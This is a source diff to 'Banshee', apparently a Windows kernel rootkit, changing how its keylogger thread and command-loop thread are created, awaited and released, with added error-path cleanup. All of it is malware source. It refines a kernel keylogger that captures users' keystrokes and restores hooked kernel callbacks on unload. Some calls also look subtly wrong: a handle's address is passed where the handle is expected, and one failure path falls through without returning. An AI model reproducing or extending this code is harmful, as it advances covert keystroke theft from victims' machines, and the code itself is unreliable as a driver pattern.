@@ -19,6 +19,9 @@
 HANDLE hKeyloggerThread;
 HANDLE hMainLoop;
 
+PVOID pKeyLoggerThreadObj;
+PVOID pMainLoopThreadObj;
+
 typedef struct _BANSHEE_PAYLOAD {
     COMMAND_TYPE cmdType;
     ULONG status;
@@ -41,15 +44,15 @@ BeUnload()
     BeGlobals::shutdown = true;
     BeGlobals::logKeys = false;
 
-    // Wait for threads to stop running TODO: proper signaling via events?
-
-    LARGE_INTEGER interval;
-    interval.QuadPart = -1 * (LONGLONG)500 * 10000;
-    KeDelayExecutionThread(KernelMode, FALSE, &interval);
+    KeWaitForSingleObject(pKeyLoggerThreadObj, Executive, KernelMode, FALSE, NULL);
+    KeWaitForSingleObject(pMainLoopThreadObj, Executive, KernelMode, FALSE, NULL);
 
     // Close thread handles
     ZwClose(hKeyloggerThread);
     ZwClose(hMainLoop);
+
+    ObDereferenceObject(pKeyLoggerThreadObj);
+    ObDereferenceObject(pMainLoopThreadObj);
 
     // Restore kernel callbacks
     {
@@ -219,13 +222,35 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
     if (NtStatus != 0)
     {
+        BeGlobals::logKeys = false;
         return NtStatus;
+    }
+
+    NtStatus = ObReferenceObjectByHandle(&hKeyloggerThread, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, &pKeyLoggerThreadObj, NULL);
+    if (NtStatus != 0)
+    {
+        BeGlobals::logKeys = false;
+        ZwClose(hKeyloggerThread);
     }
 
     // Main command loop
     NtStatus = PsCreateSystemThread(&hMainLoop, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeMainLoop, NULL);
     if (NtStatus != 0)
     {
+        BeGlobals::logKeys = false;
+        ObDereferenceObject(pKeyLoggerThreadObj);
+        ZwClose(hKeyloggerThread);
+        return NtStatus;
+    }
+
+    NtStatus = ObReferenceObjectByHandle(&hMainLoop, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, &pMainLoopThreadObj, NULL);
+    if (NtStatus != 0)
+    {
+        BeGlobals::logKeys = false;
+        BeGlobals::shutdown = true;
+        ObDereferenceObject(pKeyLoggerThreadObj);
+        ZwClose(hKeyloggerThread);
+        ZwClose(hMainLoop);
         return NtStatus;
     }
 
